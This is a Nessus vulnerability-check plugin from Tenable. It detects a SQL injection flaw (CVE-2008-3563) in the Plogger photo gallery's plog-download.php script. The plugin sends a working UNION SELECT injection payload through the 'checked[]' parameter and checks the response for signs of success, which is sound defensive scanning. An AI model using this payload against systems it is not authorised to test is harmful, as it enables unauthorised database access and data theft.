#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(33823);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2008-3563");
  script_bugtraq_id(30547);
  script_xref(name:"OSVDB", value:"49123");
  script_xref(name:"OSVDB", value:"49124");
  script_xref(name:"OSVDB", value:"49125");

  script_name(english:"Plogger plog-download.php checked[] Parameter SQL Injection");
  script_summary(english:"Tries to manipulate filename in a ZIP download");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running Plogger, an open-source photo
gallery written in PHP. 

The version of Plogger installed on the remote host fails to sanitize
input to the 'checked' array parameter of the 'plog-download.php'
script when 'dl_type' is set to 'album' before using it in a database
query.  Provided PHP's 'magic_quotes_gpc' setting is disabled, an
attacker can leverage this issue to manipulate database queries,
leading to disclosure of sensitive information, modification of data,
or attacks against the underlying database. 

Note that several other issues were disclosed along with this one and
that together they could lead to a complete compromise of the affected
install.  Nessus has not, though, checked for those other issues." );
 script_set_attribute(attribute:"see_also", value:"http://www.gulftech.org/?node=research&article_id=00121-08042008" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/495116/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/plogger", "/gallery", "/photos", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the issue to manipulate a filename in the zip download
  exploit = string("' UNION SELECT '", SCRIPT_NAME, "'", crap(data:",0", length:28), " -- ");

  r = http_send_recv3(method:"GET", port: port,
    item:string(
      dir, "/plog-download.php?",
      "dl_type=album&",
      "checked[]=", urlencode(str:exploit)));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # we get an error saying the file wasn't found or...
    string("file_get_contents(images/", SCRIPT_NAME) >< res ||
    # we see the filename in the ZIP file.
    string("\x00", SCRIPT_NAME, "PK") >< res
  )
  {
    security_warning(port);
    exit(0);
  }
}
